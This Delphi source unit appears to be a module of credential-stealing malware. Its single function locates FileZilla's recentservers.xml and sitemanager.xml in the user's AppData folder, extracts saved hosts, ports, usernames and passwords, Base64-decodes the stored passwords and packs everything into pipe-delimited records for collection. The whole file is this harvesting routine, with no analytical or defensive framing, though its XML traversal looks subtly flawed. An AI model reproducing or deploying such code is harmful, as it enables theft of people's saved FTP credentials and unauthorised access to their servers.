unit UnitFileZilla;

interface

uses
  UnitFunctions, Base64, XMLDoc;

function GetFileZillaPasswords: string;

implementation
    
function GetFileZillaPasswords: string;
var
  RecentServers, SiteManager: string;
  XmlDoc: TXMLDocument;
  Host, Username, Password: string;
  i: Integer;
begin
  Result := '';
	
  RecentServers := _AppDataDir + 'FileZilla\recentservers.xml';
  if FileExists(RecentServers) then
  begin
    XmlDoc := TXMLDocument.Create(nil);
    XmlDoc.LoadFromFile(RecentServers);

    for i := 0 to XmlDoc.ChildNodes[0].ChildNodes.Count - 1 do
    begin
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'Host' then
      Host := XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'Port' then
      Host := Host + ':' + XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'User' then
      Username := XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'Pass' then
      Password := XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;

      Result := Result + 'FileZilla' + '|';
      Result := Result + Host + '|';
      Result := Result + Username + '|';
      Result := Result + Password + '|' + #13#10;
    end;
  end;

  SiteManager := _AppDataDir + 'FileZilla\sitemanager.xml';
  if FileExists(SiteManager) then
  begin
    XmlDoc := TXMLDocument.Create(nil);
    XmlDoc.LoadFromFile(SiteManager);

    for i := 0 to XmlDoc.ChildNodes[0].ChildNodes.Count - 1 do
    begin
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'Host' then
      Host := XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'Port' then
      Host := Host + ':' + XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'User' then
      Username := XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;
      if XmlDoc.ChildNodes[0].ChildNodes[i].NodeName = 'Pass' then
      Password := XmlDoc.ChildNodes[0].ChildNodes[i].NodeValue;

      Result := Result + 'FileZilla' + '|';
      Result := Result + Host + '|';
      Result := Result + Username + '|';
      Result := Result + Base64Decode(Password) + '|' + #13#10;
    end;
  end;
end;

end.
